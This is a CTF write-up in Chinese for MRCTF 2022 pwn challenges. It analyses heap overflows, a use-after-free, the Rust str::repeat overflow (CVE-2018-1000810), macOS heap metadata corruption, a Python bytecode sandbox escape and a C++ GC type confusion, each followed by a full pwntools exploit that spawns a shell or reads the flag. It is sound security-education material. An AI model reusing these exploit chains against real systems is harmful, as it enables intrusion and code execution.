# MRCTF Pwn部分wp
[toc]


## ezbash

### 分析

题目模拟了一个简易版的bash

一个节点对应的结构体如下

```C
typedef enum
{
	DIR,
	FIL,
} TYPE;

struct Node
{
	TYPE type;
	char Name[0x10];
	char *content;
	struct Node *pre;
	struct Node *next;
	struct Node *parent;
	struct Node *head;
};
```

在cp的实现中，当目标文件名已经存在时，源文件内容会直接覆盖目标文件内容
而源文件和目标文件都有内容时，需要考虑重新分配内存空间，这里的实现存在一定的不严谨
`overwrite`函数中

![](https://md.buptmerak.cn/uploads/upload_416fc9a06ffe5cf6183584ff14323562.png)


注意到这里使用`strlen`测量长度，有一种可能当堆块复用时chunk的内容和下一个chunk的size位是连在一起的，就会发生`strlen`测出来的长度大于内容实际长度的情况

而一个文件内容的写入使用的是`echo`
这里本人悄悄把重定向符改成了`->`，主要是为了保证一定的逆向过程（，配合`echo`能够对文件写入内容
然而`echo`写入内容时对内存的申请并不根据实际size申请
而是根据实际输入情况动态变化，每次变化`DEFAULT_BUFSIZE=0x150`的倍数，相对不好控制大小


![](https://md.buptmerak.cn/uploads/upload_b79645652a9a1dc6579116e67f1c858f.png)



但是同样在cp功能中，当目标文件存在但没有写入过内容时，需要申请相应的空间存放源文件内容，这里就是根据源文件内容长度进行的申请，所以可以很好地用来控制size

![](https://md.buptmerak.cn/uploads/upload_4cf460598bbafcb91a152da2cb42bfef.png)

![](https://md.buptmerak.cn/uploads/upload_76ba0c803969e212693ce656263bb2c6.png)



### 思路

根据上述，构造内容拼接到下一个chunk的size，使`strlen`测出的长度大于实际长度两个字节，控制源文件内容长度与目标文件的实际长度+2相同，并布置源文件内容的最后两个字节为想要的size，从而利用堆溢出造成chunk overlap

改成一个很大的数字，进而释放掉，泄露libc基址

在这之后利用读入command时使用`realloc`动态分配内容，输入较多内容从而直接拿回unsorted bin，并事先在其中包含一块tcache，最后打tcache即可getshell。需要注意的是这一块tcache原本属于节点之一，所以顺手把其中的指针都清零避免后续在遍历节点时出现意料之外的crash。


### exp

```python
from pwn import*
context(os='linux', arch='amd64', log_level='debug')
r = process('./ezbash')
libc = ELF('./libc.so.6')

sla = lambda x : r.sendlineafter('hacker:/$ ', x)

p = "touch "+"AAA"
sla(p)
p = "touch "+"BBB"
sla(p)
p = "touch "+"CCC"
sla(p)

p = 'echo '+'A'*0xf8+" -> "+'AAA'
sla(p)
p = 'cp AAA BBB'
sla(p)

p = 'echo '+'A'*0xf8
p = p.encode('ISO-8859-1')
p+= p16(0x431)
p = p.decode('ISO-8859-1')
p+= ' -> '+'CCC'
sla(p)

for i in range(10):
	p = "touch "+"pad"+str(i)
	sla(p)

p = 'cp CCC BBB'
sla(p)

p = 'rm CCC'
sla(p)

p = 'echo '.encode('ISO-8859-1')
p+= p8(0xd0)
p = p.decode('ISO-8859-1')
p+= ' -> '
p+= 'BBB'
sla(p)

p = 'cp BBB pad9'
sla(p)

p = 'cat pad9'
sla(p)
libc.address = u64(r.recvuntil(b'\x7f')[-6:]+b'\x00\x00')-\
	1104-0x10-libc.sym['__malloc_hook']

p = 'rm pad0'
sla(p)

p = b'A'*0x130
p+= p64(0)+p64(0x51)
p+= p64(libc.sym['__free_hook']-4)
p+= p64(0)*8+p64(0x51)+p64(0)*6
sla(p)

p = 'touch final1\x00'
sla(p)

p = 'echo /bin/sh -> final1'
sla(p)

p = b'touch '+p64(libc.sym['system'])
sla(p)

p = 'rm final1'
sla(p)

log.success(hex(libc.address))
r.interactive()
```

### 非预期

（早知道不设计洞了，让大佬🚪ri就完事了orz）

最后提交的wp中，只有r4战队使用的是预期解，非预期有两种

1. cp中，当目标文件内容⻓度小于源文件内容长度，realloc返回值赋给了结构体指针，又能够以指针+0x18索引进行写操作，于是存在任意写，这也是大部分战队提交的wp中利用的漏洞。这里纯属本人沙贝了不知道为啥少打了东西😢

2. 还有一个洞在`cd`中`strcat`拼接路径时，当前路径名称存在bss段，其下方放了一个指向当前目录节点的指针，对路径字符串的长度限制不到位于是存在off by one。然而由于使用的是`strcat`，复制后会添加上截断字符，会把指针截断，所以最终只能用作off by null使用，可以用来控制节点。（polaris大佬的做法）


## zigzag_embryo

> 获取flag0

逆向分析，发现main函数前还套了一层

![](https://md.buptmerak.cn/uploads/upload_3113d16b9e3173ff331517b6cd601d6b.png)

发现存在后门函数，菜单0xdeadbeef进入，再输入ip和port就可以把flag输出到服务器上

![](https://md.buptmerak.cn/uploads/upload_5df119f3f1f7a64504d34cd058f411b4.png)

exp:

```python-repl=
from pwn import *
import socket

p = remote('0.0.0.0', 9999)

p.sendline(str(0xdeadbeef))
p.send(p16(9998)[::-1]+socket.inet_aton('0.0.0.0'))

p.interactive()
```

## zigzag_baby

> 获取flag1

由于这是一个猜位置的游戏，而且产生的随机数都给出了，所以我们不需要管中间的逻辑，直接gdb中模拟运行，修改内存，然后任由后面接着跑即可

```python-repl=
from pwn import *

context.terminal = ['gnome-terminal', '-x', 'bash', '-c']
p = remote('0.0.0.0', 9999)
# p = process('./zigzag')

tmp = int(p.recvuntil(' '), 16)
lheap = [tmp]
for i in range(1, 0xfff):
    tmp = p.recvuntil(' ')
    lheap.append(int(tmp, 16))
    k = i
    while lheap[k] < lheap[(k+1)//2-1]:
        tmp = lheap[k]
        lheap[k] = lheap[(k+1)//2-1]
        lheap[(k+1)//2-1] = tmp
        k = k//2
passwd = lheap[-1]

gdb_script = 'b *$rebase(0x3012)\nc\n'
for k, v in enumerate(lheap):
    gdb_script += f'set *((long long*)&tree+{3+k})={v}\n'
gdb_script += f'b main\nc\nsearch -8 {passwd}\n'
g = gdb.debug('./zigzag', gdb_script)
g.interactive()

p.interactive()
```

找到5个结果，第二个值得地址就是Tree::sign判断逻辑中tree[0x1003+idx]的地址，用&tree[0x1003+idx]-&tree[0x1003]就能得到偏移量idx

![](https://md.buptmerak.cn/uploads/upload_a9442a7701f2cdd1617879f6db066fe7.png)

此处得到294（此处0x5555555652f8是&tree[0x1003]）

![](https://md.buptmerak.cn/uploads/upload_02bb3fab7d04746315fc25ca451c39c4.png)


关掉g.interactive()，手动输入交互逻辑，得到flag

![](https://md.buptmerak.cn/uploads/upload_d0c9eb9d18f84ee3a221e459a428f3d0.png)

## zigzag_easy

> 获取flag

Tree::deleteNote中存在std::vector\<Point\>::erase逻辑

![](https://md.buptmerak.cn/uploads/upload_be1488dea8c41efbea7adcf01c4eb8df.png)

std::vector::erase(a, idx)的本质逻辑是delete vec[idx]，vec[idx:-2]=vec[idx+1:-1]，delete vec[-1]。

![](https://md.buptmerak.cn/uploads/upload_49bd67495c88d40479b00bbea0d74674.png)

其中最后一步会执行vec[-1]的析构函数，而Point::~Point会delete在sign中申请的内存，存在UAF漏洞

![](https://md.buptmerak.cn/uploads/upload_a421b24bcfa28930302a00717641eaf8.png)

最后就是判断这个vec[-1]在哪，小根堆从后往前的顺序进的tree，也就是说vec[-1]是lheap[0]，也就是所有元素中最小的那个；然后进入SPLAY的tree中，因为是最小的，所以在SPLAY中的中序遍历必定是第一个，也就是第一个进入大根堆bheap的；因为这个值比所有树都小，所以这个节点会一直沿着bheap的左子树下降，直到bheap[0x7ff]。所以不管数怎么随机，vec[-1]就在bheap[0x7ff]上。

结合以上思路，无需理会算法逻辑，直接输入idx=0x7ff，接着就是UAF覆盖__free_hook为system，getshell（获得flag）

```python-repl=
from pwn import *
import subprocess, sys, os
from time import sleep

sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)

ip = '0.0.0.0'
port = 9999
remote_libc_path = './libc.so.6'

context(os='linux', arch='amd64')
context.log_level = 'debug'

def loadlibc(filename = remote_libc_path):
    global libc
    libc = ELF(filename, checksec = False)
def one_gadget(filename = remote_libc_path):
    return map(int, subprocess.check_output(['one_gadget', '--raw', filename]).split(' '))
def str2int(s, info = '', offset = 0):
    if type(s) == int:
        s = p.recv(s)
    ret = u64(s.ljust(8, b'\0')) - offset
    success('%s ==> 0x%x'%(info, ret))
    return ret
def sl(content):
    p.sendline(content)
    sleep(0.1)
def se(content):
    p.send(content)
    sleep(0.1)
NUM = (0x1000//2)-1
def chose(idx):
    sl(str(idx))
def add(idx=NUM):
    chose(1)
    sl(str(idx))
def edit(content, idx=NUM):
    chose(2)
    sl(str(idx))
    se(content)
def show(idx=NUM):
    chose(3)
    sl(str(idx))
def free(idx):
    chose(4)
    sl(str(idx))
def fast(content='\n'):
    chose(5)
    se(content)

p = remote('0.0.0.0', 9999)
add()
sla('have a try?\n', 'N')
fast()
p.recv(0x100)
for i in range(7):
    free(i)
    edit('\0'*0x10)
free(7)
show()
p.recv(8)
loadlibc()
libc.address = str2int(8, 'libc', libc.sym['__malloc_hook']+96+0x10)
payload = flat(libc.sym['__free_hook'], 0)
edit(payload)
fast('/bin/sh\0')
fast(p64(libc.sym['system']))
free(8)

p.interactive()
```

## Rust_book
RustC 1.29.0 [CVE-2018-1000810]
### 分析：

````
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x200000)
````

只开启NX保护

直接运行能看出来是一个菜单题的形式，结合题目名字是一个rust程序

![](https://pic.imgdb.cn/item/621624a12ab3f51d91fa1170.png)

扔到IDA pro中分析，观察main得知这是一个多线程程序

存在线程checking和线程pwn，主要逻辑在线程pwn中，线程checking实现了一个类似canary的功能

线程pwn也基本就是一个菜单题的主要形式

![](https://pic.imgdb.cn/item/621624e32ab3f51d91fac2ee.png)

发现存在后门函数

![](https://pic.imgdb.cn/item/6216251d2ab3f51d91fb5059.png)

查看该函数的调用关系发现

![](https://pic.imgdb.cn/item/624543c027f86abb2afafa93.png)

![](https://pic.imgdb.cn/item/621625a92ab3f51d91fca54d.png)

存在一个全局静态变量FUNC，和backdoor函数的关系为：

````rust
static FUNC: (fn()->()) = backdoor;
````

并且通过nm命令

````nm -C ./rust_book | grep FUNC````

可以得到

````0000000000700540 D rust_book::FUNC::hef8b6fd3f3627393````

### 漏洞：

结合二进制程序和给出的RustC版本1.29.0，注意到在choice=5中存在：

![](https://pic.imgdb.cn/item/6216280d2ab3f51d9102ba49.png)

经过查找可以知道 在RustC的1.29.0版本中repeat函数存在严重的整数溢出问题【CVE-2018-1000810】

根据程序调试和分析，checkout的作用是直接打印shopping cart中的book的name，打印次数取决于book的number

根据ida分析和程序调试，虽然在choice=0中book的number被限制，但是在choice=2中可以修改number，并且大小无限制

所以我们可以利用修改number为某些特定的数，就可以触发【CVE-2018-1000810】整数溢出。

### CVE-2018-1000810 :

该CVE的简单POC为：

````rust
fn main() { let _s = "AAAA".repeat(0x4000000000000001); }
````

即在Rust 版本1.29.0以及更低版本中，repeat的参数超过0x4000000000000000即会被当成0x0，所以在该POC中会开辟一个能够存放0x1个“AAAA”的空间并填充上0x4000000000000001个“AAAA”，存在严重的溢出问题。

cve具体分析参考最后的参考资料

### 利用：

同时由于这是一个多线程程序，基于对CVE-2018-1000810了解之后可以有这样的攻击思路

由于在线程checking中存在trait的方法NamedCanary

并且存在通过NamedCanary自己定义的结构体方法

![](https://pic.imgdb.cn/item/62162b702ab3f51d910b993b.png)

需要注意的是，线程checking具体实现了什么我们并不需要关心，我们只需要知道在线程pwn中存在repeat的整数溢出，在线程checking中存在自己定义的方法并且在loop循环中不断调用

所以我们只需要在线程pwn中溢出backdoor函数的地址使其能够覆盖线程checking中自己定义的方法的地址就可以调用backdoor

由于存在静态变量FUNC，我们尝试直接在线程pwn中利用repeat溢出暴力覆盖大量所有数据为FUNC，经过GDB调试发现checking线程中调用函数地址会被覆盖成FUNC+0x18，所以我们利用repeat溢出FUNC-0x18就可以覆盖成FUNC最终在checking线程中调用backdoor得到flag。

### exp：

````python
# -*- coding: utf-8 -*-
from pwn import *
context(os='linux',arch='amd64')
context.log_level = 'debug'

# nm -C ./rust_book | grep FUNC
# 0000000000700540 D rust_book::FUNC::hef8b6fd3f3627393
FUNC = 0x000000000700540
target = FUNC-0x18

# CVE-2018-1000810
while True:
    p = process("./rust_book")
    # p = remote("0.0.0.0",9999)
    p.sendlineafter(">> Your choice:","0")
    p.sendlineafter("Book name: (str)",p64(target)*8)
    p.sendlineafter("Book description: (str)","exp")
    p.sendlineafter("Book unit price: (unsigned int)","1")
    p.sendlineafter(">> Your choice:","1")
    p.sendlineafter("Book ID:","0")
    p.sendlineafter("How many copies of that book do you want to buy: (unsigned int)","10")
    p.sendlineafter(">> Your choice:","2")
    p.sendlineafter("Idx:","0")
    p.sendlineafter(">> Your choice:","2")
    p.sendlineafter("you want to buy : (unsigned int)","288230376151711745") 
    # quantity - (2**64 / 64) + 1 == 0x400000000000001 == 288230376151711745
    p.sendlineafter(">> Your choice:","5")
    try:
        # p.recvuntil("flag")
        flag = p.recvuntil("}")
        print flag
        pause()
    except:
        p.close()
````

### 参考资料：

[str::repeat - stable wildcopy exploit | str_repeat_exploit (saaramar.github.io)](https://saaramar.github.io/str_repeat_exploit/)

[[stable\] std: Check for overflow in `str::repeat` by alexcrichton · Pull Request #54397 · rust-lang/rust (github.com)](https://github.com/rust-lang/rust/pull/54397)

https://nvd.nist.gov/vuln/detail/CVE-2018-1000810
## mmmAgzine

题目考查macos 10.15.7版本下tiny heap region metadata破坏造成double free的利用。由于macOS开机后各个库装载地址不变的特性，首先泄露库的地址。程序没有开启pie并给出了magzine_list的地址。由于macos会根据随机选择不同region进行堆的分配，我们可通过拼接name来实现低位堆地址的泄露，为方便后续利用，申请三个堆至同一region中。magic函数存在两字节的溢出，可通过该溢出将指向堆的指针指向metadata，并通过edit函数修改metadata，通过此将已释放的block标记为未释放，实现double free。然后通过修改block的previous域来实现任意地址分配，将chunk分配至default malloc zone中泄露函数指针，进而计算出libsystem_malloc.dylib的装载地址。由于程序未开启PIE，cookie为固定值0，可直接伪造prev和next指针。然后根据各个库之间的偏移计算出libsystem_c.dylib的地址，并获得system函数的地址。然后就是getflag，跟泄露库地址的过程相同，利用任意地址分配修改la_symbol_ptr@free（类似于linux下的got表）的值为system，调用free触发system，通过getflag来获得flag。

~~~python
#!/usr/bin/python3
# coding=utf-8
from pwn import *

local = 0
ip = '172.83.156.145'
port = 19091
proc = './mmmAgzine'

context.log_level = 'debug'

r = lambda x=4096: io.recv(x)
ru = lambda x: io.recvuntil(x)
s = lambda x: io.send(x)
sl = lambda x: io.sendline(x)
l64 = lambda: u64(ru(b'\x7f')[-6:].ljust(8, b'\x00'))
su = lambda x: success('%s >> %s' % (x, hex(eval(x)))) if type(eval(
    x)) == int else success('%s >> %s' % (x, eval(x)))


def add(idx, name, sz):
    ru('You Step ## ')
    sl(str(1))
    ru('Please input chapter index ## ')
    sl(str(idx))
    ru('Please input chapter name ## ')
    s(name)
    ru('Please input chapter size ## ')
    sl(str(sz))


def edit(idx, ctt):
    ru('You Step ## ')
    sl(str(2))
    ru('Please input chapter index ## ')
    sl(str(idx))
    ru('Please input new chapter content ## ')
    s(ctt)


def dele(idx):
    ru('You Step ## ')
    sl(str(3))
    ru('Please input chapter index ## ')
    sl(str(idx))


def show(idx):
    ru('You Step ## ')
    sl(str(4))
    ru('Please input chapter index ## ')
    sl(str(idx))


def magic(idx, name):
    ru('You Step ## ')
    sl(str(666))
    ru('Please input chapter index ## ')
    sl(str(idx))
    ru('Please input new chapter name ## ')
    s(name)


def add_in_same_region(idx, sz, region):
    add(idx, 'a' * 0x10, sz)
    show(idx)
    ru('a' * 0x10)

    heap_addr = u32(ru('\n')[:-1].ljust(4, b'\x00'))
    while (heap_addr >> 20 != region):
        dele(idx)
        add(idx, 'a' * 0x10, sz)
        show(idx)
        ru('a' * 0x10)
        heap_addr = u32(r(3).ljust(4, b'\x00'))
    return heap_addr


def checksum(ptr):
    sum = 0
    for _ in range(8):
        sum += (ptr & 0xff)
        ptr = ptr >> 8
    return sum & 0xf


################# leak lib address ##################

region = 2
if local:
    io = process(proc)
else:
    io = remote(ip, port)

ru('Gift: ')
magzine_list_addr = eval(r(11))
su('magzine_list_addr')

heap_addr_list = []

for i in range(3):
    heap_addr_list.append(add_in_same_region(i, 0x100, region))

bitmap_offset = (heap_addr_list[1] - region * 0x100000 -
                    0x4080) // 0x10
bitmap_pos = bitmap_offset % 0x10
bitmap_index = bitmap_offset // 0x20
fakemeta = 0
for i in range(4):
    fakemeta = (1 << bitmap_pos) + (fakemeta << 16)
heap_one_bitmap_addr = 0x100000028 + region * 0x100000 + bitmap_index * 8
magic(0, b'a' * 0x10 + p16(heap_one_bitmap_addr & 0xffff))

dele(1)
edit(0, p64(fakemeta))
dele(1)

a = add_in_same_region(3, 0x100, region)

edit(
    3,
    p64(0x10000f010) +
    p64(((magzine_list_addr + 0x60) >> 4) | checksum(magzine_list_addr + 0x60) << 60))
print(hex(add_in_same_region(4, 0x100, region)))
show(2)
libmalloc_base = l64() - 0x4358

io.close()

libc_base = libmalloc_base - 0x16a000
system_addr = libc_base + 0x77fdd
su('libmalloc_base')
su('libc_base')
su('system_addr')

################## get flag ##################

region = 2
if local:
    io = process(proc)
else:
    io = remote(ip, port)

ru('Gift: ')
magzine_list_addr = eval(r(11))
su('magzine_list_addr')

add(0xf, 'a', 0x30)
edit(0xf, './getflag')

heap_addr_list = []

for i in range(3):
    heap_addr_list.append(add_in_same_region(i, 0x100, region))

bitmap_offset = (heap_addr_list[1] - region * 0x100000 -
                    0x4080) // 0x10
bitmap_pos = bitmap_offset % 0x10
bitmap_index = bitmap_offset // 0x20
fakemeta = 0
for i in range(4):
    fakemeta = (1 << bitmap_pos) + (fakemeta << 16)
heap_one_bitmap_addr = 0x100000028 + region * 0x100000 + bitmap_index * 8

magic(0, b'a' * 0x10 + p16(heap_one_bitmap_addr & 0xffff))
dele(1)
edit(0, p64(fakemeta))
dele(1)

add_in_same_region(3, 0x100, region)
edit(3, p64(system_addr) + p64((0x100008020 >> 4) | checksum(0x100008020) << 60))
add_in_same_region(4, 0x100, region)
dele(0xf)
print(r())
io.close()
~~~



## Dynamic
首先用python沙箱逃逸技巧拿到一些类的构造方法，然后创建一个bytearray对象并在其buffer中伪造一个bytearray对象，这个对象buffer起始地址为0，大小为一个极大值。然后利用python的LOAD_CONST bug构造一个能够返回我们伪造的bytearray对象的DynaFunc对象。有了这个bytearray对象后即可任意读写，写返回时的栈orw读出flag即可。虽然DynaFunc里没有故意设置漏洞，但说不定会有，感兴趣的dalao们可以康康https://github.com/veltavid/MRCTF2022/tree/main/Dynamic。

exp:

```python=
from pwn import *

lib=ELF("./libc.so.6")
python=ELF("./python3.10")
malloc_got=python.got['malloc']
environ_offset=python.sym['environ']
malloc_offset=lib.sym['malloc']
open_offset=lib.sym['open']
read_offset=lib.sym['read']
write_offset=lib.sym['write']
libc_start_main_offset=0x240B3

code="""
str="".__class__
bytearray=[x for x in b"".__class__.__base__.__subclasses__() if "bytearray" in str(x)][1]
LOAD_CONST=100
EXTENDED_ARG=144
RETURN_VAL=83

p8_code=\"\"\"
bytes=b"".__class__
return bytes([fd&0xff])
\"\"\"

p64_code=\"\"\"
bytes=b"".__class__
result=[]
for i in range(8):
	result.append((fd>>(i*8))&0xff)
return bytes(result)
\"\"\"

u64_code=\"\"\"
res=0
for x in fd[::-1]:
	res = (res<<8) | x
return res
\"\"\"

p8=DynaFunc(func)
p64=DynaFunc(func)
u64=DynaFunc(func)
exp_func=DynaFunc(func)
p8.set(p8_code)
p64.set(p64_code)
u64.set(u64_code)

const_tuple=()
fake_bytearray=p64(0x1000)+p64(id(bytearray))+p64(0x7fffffffffffffff)+p64(0)+p64(0)+p64(0)+p64(0)
fake_bytearray_obj=bytearray(fake_bytearray)
fake_bytearray_obj_ptr=id(fake_bytearray_obj)+0x20
const_tuple_ptr=id(const_tuple)+0x18
offset=(fake_bytearray_obj_ptr-const_tuple_ptr)//8

exp_func_bytecode=b""
for i in range(4):
	exp_func_bytecode+=p8(EXTENDED_ARG)+p8(offset>>(32-i*8))
exp_func_bytecode+=p8(LOAD_CONST)+p8(offset)
exp_func_bytecode+=p8(RETURN_VAL)

flag_str="flag"
flag_str_addr=id(flag_str)+0x30
exp_func.__code__=exp_func.__code__.__class__(0,0,0,0,0,0,exp_func_bytecode,const_tuple,(),(),"","",0,b"")
exp_ptr=exp_func()

libc_base=u64(exp_ptr[{}:{}+8])-{}
print("libc_base:",hex(libc_base))
pop_rdi=libc_base+0x23b72
pop_rsi=libc_base+0x2604f
pop_rdx_r12=libc_base+0x119241
environ_addr={}
ope_addr=libc_base+{}
read_addr=libc_base+{}
write_addr=libc_base+{}
libc_start_main_ret_addr=libc_base+{}
environ_heap_addr=u64(exp_ptr[environ_addr:environ_addr+8])
stack_addr=u64(exp_ptr[environ_heap_addr:environ_heap_addr+8])&0xfffffffffffffff0#-0x368
while(stack_addr):#search for return addr in stack
	tmp=u64(exp_ptr[stack_addr:stack_addr+8])
	if(tmp==libc_start_main_ret_addr):
		break
	stack_addr-=8
flag_addr=stack_addr+0x200

payload=p64(pop_rdi)+p64(flag_str_addr)+p64(pop_rsi)+p64(0)+p64(pop_rdx_r12)+p64(0)+p64(0)+p64(ope_addr)
payload+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(flag_addr)+p64(pop_rdx_r12)+p64(0x40)+p64(0)+p64(read_addr)
payload+=p64(pop_rdi)+p64(1)+p64(write_addr)
c=stack_addr
for x in payload:
	exp_ptr[c]=x
	c+=1
EOF
""".format(malloc_got,malloc_got,malloc_offset,environ_offset,open_offset,read_offset,write_offset,libc_start_main_offset)

print(len(code))
with open("exp","w") as fd:
	fd.write(code)

sh=remote("127.0.0.1",1337)
sh.sendafter('> ',code)
sh.interactive()
```
## Toy_bricks
### 漏洞分析
> 漏洞发现者: [@P1umer](https://p1umer.github.io/)

A Tiny, precise, incremental, mark & sweep, Garbage Collector for C++

该GC为每一个C++的结构都创建了一个wrapper用来追踪，使用的是三色GC算法。
wrapper结构如下：
```
-------------
|   meta    |
-------------
|   Object  |
-------------
```
meta作为附加的头，存储了一些标记位，比如三色算法中的颜色，以及遍历需要的id等。
这个实验性的GC在处理继承方面用了错误的方式。

单继承时内存结构:
```
----------------
|  meta(child) |
----------------
|    base      |
----------------
|    child     |
----------------
```
为了可以追踪到子类向base类转换后的对象，tgc的做法是:
```c++
ObjMeta* Collector::globalFindOwnerMeta(void* obj) {
  shared_lock lk{mutex, try_to_lock};
  auto* meta = (ObjMeta*)((char*)obj - sizeof(ObjMeta));
  return meta;
}
```
针对上述的内存布局，由于C++从child->base的强制转换，会返回base内存处的头指针:
```c++
        ----------------
        |  meta(child) |
  --->  ----------------
        |    base      |
        ----------------
        |    child     |
        ---------------- 
```
然后再减去sizeof(ObjMeta)，自然返回了wrapper的起始地址，实现了转换后对象的跟踪。

漏洞出在多重继承时:
```c++
    ----------------
    |  meta(child) |
    ----------------
    |    base1     |
    ----------------
    |    base2     |
    ----------------
    |    child     |
    ----------------
```
从child转换回base2，那么C++返回的指针如下:
```
        ----------------
        |  meta(child) |
        ----------------
        |     base1    |
----->  ----------------
        |     base2    |
        ----------------
        |     child    |
        ----------------
```
再减去sizeof(ObjMeta)，返回的则是base1的成员。
造成可以使用base1成员数据来伪造meta(base2)的攻击效果。
### 漏洞利用
- 回到题目上来，根据上述漏洞描述，在使用 `separate` 功能将 FantasticBeasts 分离为 Cat 和 Dog 后，新 Dog 指针指向原 FantasticBeasts 头部，新 Cat 指针则指向 Dog 的成员变量。
- 此时由于 Dog 的 meta 还是 FantasticBeasts 的，造成了类型混淆，所以 delete  Dog 时会调用 FantasticBeasts 的析构函数，其又会依次调用两个基类的析构函数，所以会把 Dog 和 Cat 都给释放掉，而此时 Cat 还存储在 Cat_Pool 中，所以造成了 UAF。
- 然后再次 `combine` 的时候可以泄露 libc 和 heap，最后用 Dog 的成员变量伪造 Cat 的 meta 虚表指针，在虚表中构造好恶意payload（我个人使用的是klass->memHandler字段）劫持执行流即可（Sell Cat => tgc::details::ObjMeta::destroy => klass->memHandler(klass)），赛后唯2解的wp中，AAA的师傅用的和我一样的方法，Lilac的师傅使用了另外一种方法，也非常巧妙😍。
```cpp
void ObjMeta::destroy() {
  if (!arrayLength)
    return;
  klass->memHandler(klass, ClassMeta::MemRequest::Dctor, this);
  arrayLength = 0;
}
```

exp:
```python
#coding:utf-8

from pwn import *
import sys,os,string,base64

elf_path = './pwn'
remote_libc_path = './libc.so.6'

context(os='linux',arch='amd64')
context.terminal = ['tmux','split','-h']
#context.log_level = 'debug'

if sys.argv[1] == 'local':
	p = process(elf_path)
	if context.arch == 'amd64':
		libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
	else:
		libc = ELF('/lib/i386-linux-gnu/libc.so.6')
else:
	p = remote('140.82.17.215',24310)
	libc = ELF(remote_libc_path)

def new_dog(name, age):
	p.recvuntil('> ')
	p.sendline('1')
	p.recvuntil('> ')
	p.sendline('1')
	p.recvuntil('name: \n')
	p.sendline(name)
	p.recvuntil('age: \n')
	p.sendline(str(age))

def new_cat(color):
	p.recvuntil('> ')
	p.sendline('1')
	p.recvuntil('> ')
	p.sendline('2')
	p.recvuntil('color: \n')
	p.sendline(color)

def delete_dog():
	p.recvuntil('> ')
	p.sendline('2')
	p.recvuntil('> ')
	p.sendline('1')

def delete_cat():
	p.recvuntil('> ')
	p.sendline('2')
	p.recvuntil('> ')
	p.sendline('2')

def cb():
	p.recvuntil('> ')
	p.sendline('3')

def sp():
	p.recvuntil('> ')
	p.sendline('4')

for i in range(10):
	new_dog('\x01'*0xf0, 0xdeadbeef)

new_cat('\x02'*0xf0)

for i in range(7):
	delete_dog()

cb()

for i in range(2):
	delete_dog()

sp()
delete_dog()

new_dog('\x01'*0xf, 0xdeadbeef)
cb()
p.recvn(0x100)
p.recvn(11)
heapbase = u64(p.recvn(8))-(0x4494b0-0x41e000)
log.success('heapbase = '+hex(heapbase))
p.recvn(8)
libcbase = u64(p.recvn(8))-(0x7f0f729d0c00-0x7f0f727f0000)
log.success('libcbase = '+hex(libcbase))

fake_vtable = heapbase + (0x19c4fb0-0x199a000)
new_dog(p64(0)+p64(fake_vtable)[:7], 0xdeadbeef)
new_cat('b'*0xf)

magic = libcbase + (0x7f9a3f2e8080-0x7f9a3f19b000)+26
lr = libcbase + 0x000000000005525c
pop_rdi = libcbase + 0x0000000000028a55

payload = p64(magic)+p64(libcbase+0x0000000000028a4e)
payload+= p64(0xdeadbeef)+p64(fake_vtable)
payload+= p64(0)+p64(lr)
payload+= p64(pop_rdi)+p64(fake_vtable+8*10)
payload+= p64(libcbase+libc.sym['system'])+p64(fake_vtable)
payload+= '/bin/sh\x00'
payload+= p64(0xdeadbeef)*9

new_cat(payload)

cb()
sp()

delete_cat()

p.interactive()
```

## Sgame
### 漏洞分析
此题为大二时计算机网络课程作业改编而来，在出题过程中我也是一直在修bug哈哈，当时出完可能就觉得还会有其他漏洞，赛后发现AAA的大佬就是用的非预期漏洞，而且应该是要比预期解复杂，膜😍。

预期漏洞：smtp.so中，使用`strcat`拼接subject，没有限制长度，造成了溢出，可以修改subject之后紧邻的data指针。

![](https://md.buptmerak.cn/uploads/upload_4e1ff388c3d151929899a72a1954a933.png)

![](https://md.buptmerak.cn/uploads/upload_e16e95545aebe5de6a9ff4d2a4c16ff5.png)

![](https://md.buptmerak.cn/uploads/upload_4a6276c767b011d28a5dda4e83e6a82e.png)


但是由于 `strcat` 有 `\x00` 截断，且没办法泄露地址，所以问题等于转化为了`off-by-null`。

### 漏洞利用
flag 内容被写到了堆上，data 内容也在堆上，且 data 地址在 flag 地址之后不远处，所以 `off-by-null` 改 data 指针最后一字节为 `\x00` 实际上是可能使修改后的地址正好为 flag 地址的（正是我们的目标），前提是 flag 堆块的地址的 lsb 必须得是 `\x00`。那么如何让 flag 堆块地址的 lsb 变为 `\x00` 呢，解决方法是通过调整 payload 长度或 data 长度来将 flag 堆块往后挤压，最终将其地址的 lsb 调整为 `\x00` 即可。

注：由于远程环境重定向了标准输出和标准错误，所以堆块环境会与本地有区别（我自己出完题测试的时候也遇到了这个问题），（我个人的）解决方法为小幅度爆破，因为 data 长度调整范围也就 0x00~0xF0 之间，所以控制好 subject 长度使其触发 `off-by-null`，然后使 data 长度从0x00 开始每8个字节递增，依次尝试即可。

由于每个选手的邮箱地址长度不同，所以并无统一的 payload，我自己的 payload如下：

![](https://md.buptmerak.cn/uploads/upload_8cf36242fdd307c056b4b123eb92fb97.png)

最终攻击效果：
![](https://md.buptmerak.cn/uploads/upload_3f18afb603dfab18d47bd76cb673457a.png)

![](https://md.buptmerak.cn/uploads/upload_4fde138481e2c986618f910cc07a2593.png)



